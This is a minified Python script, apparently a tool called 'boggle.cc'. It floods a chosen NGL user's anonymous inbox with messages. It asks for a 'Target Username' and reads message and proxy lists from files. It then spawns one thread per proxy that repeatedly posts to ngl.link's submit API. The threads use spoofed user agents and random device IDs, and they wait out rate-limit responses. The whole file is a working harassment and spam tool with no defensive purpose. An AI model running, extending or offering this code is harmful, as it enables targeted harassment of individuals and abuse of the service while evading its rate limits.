T=KeyboardInterrupt
N='reset'
M=print
J=True
G='warning'
F='success'
E='error'
C='critical'
import random as O,time,threading as B,requests as D,urllib3 as P,os
from typing import List,Dict,Iterable
import sys
from fake_useragent import UserAgent as U
P.disable_warnings(P.exceptions.InsecureRequestWarning)
V=10
W='https://ngl.link/api/submit'
Q=B.Lock()
R=B.Lock()
K=[]
H=[]
I=[]
X=U()
L={E:'\x1b[38;5;196m',F:'\x1b[38;5;82m',G:'\x1b[38;5;214m',C:'\x1b[38;5;200m',N:'\x1b[0m'}
def f(msg):
	with Q:M(msg,flush=J)
def A(status,msg):
	A=status
	with Q:B={E:'×',F:'»',G:'!',C:'†'};D=L.get(A,L[N]);H=B.get(A,'•');M(f"{D}{H} {msg}{L[N]}",flush=J)
def Y():A='\n    ╔═══════════════════════════════════════════════════════════════╗\n    ║                          boggle.cc                            ║\n    ║                    Created by: borthdayzz                     ║\n    ╚═══════════════════════════════════════════════════════════════╝\n    ';M(A)
def S(filename):
	B=filename
	try:
		with open(B,'r',encoding='utf-8')as D:
			C=[A.strip()for A in D if A.strip()]
			if not C:A(G,f"Empty file: {B}")
			return C
	except FileNotFoundError:A(E,f"File not found: {B}");return[]
def Z(username):return{'Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','Referer':f"https://ngl.link/{username}",'Origin':'https://ngl.link','User-Agent':X.random}
def a(proxy,username,messages,counter,stop_event):
	J=counter;I=username;B=proxy;L=D.Session();M={'http':f"http://{B}",'https':f"http://{B}"}
	while not stop_event.is_set():
		N=Z(I);P={'username':I,'question':O.choice(messages),'deviceId':''.join(O.choices('0123456789abcdef',k=42)),'gameSlug':'','referrer':''}
		try:
			Q=L.post(W,headers=N,data=P,proxies=M,timeout=(2,5));H=Q.status_code
			if H==429:time.sleep(V);continue
			if H!=200:A(E,f"{H} | drop {B}");break
			with R:J[0]+=1;A(F,f"Messages Sent: {J[0]}")
		except D.exceptions.Timeout:A(G,f"Timeout | {B}");break
		except(D.exceptions.ProxyError,D.exceptions.SSLError,D.exceptions.ConnectionError):
			A(E,f"Failed | {B}")
			with R:
				if B not in K:K.append(B)
			break
		except Exception as S:A(C,f"Error | {B} | {type(S).__name__}");break
def b(username,messages,proxies):
	E=[0];F=B.Event();C=[]
	for D in proxies:
		if D in K:continue
		A=B.Thread(target=a,args=(D,username,messages,E,F),daemon=J);C.append(A);A.start()
	for A in C:A.join()
def c():
	while J:
		try:
			B=input('\x1b[38;5;87m⟫ Target Username: \x1b[0m').strip()
			if not B:A(G,'Username cannot be empty');continue
			return B
		except T:A(C,'\nOperation cancelled');raise
def d():os.system('cls'if os.name=='nt'else'clear')
def e():
	d();Y();A(F,'Loading resources...');global H,I;H=S('messages.txt');I=S('proxy.txt')
	if not H or not I:A(C,'Required files missing or empty');return
	try:B=c();A(F,f"Starting attack on: {B}");b(B,H,I)
	except T:A(C,'\nShutting down...');return
if __name__=='__main__':e()
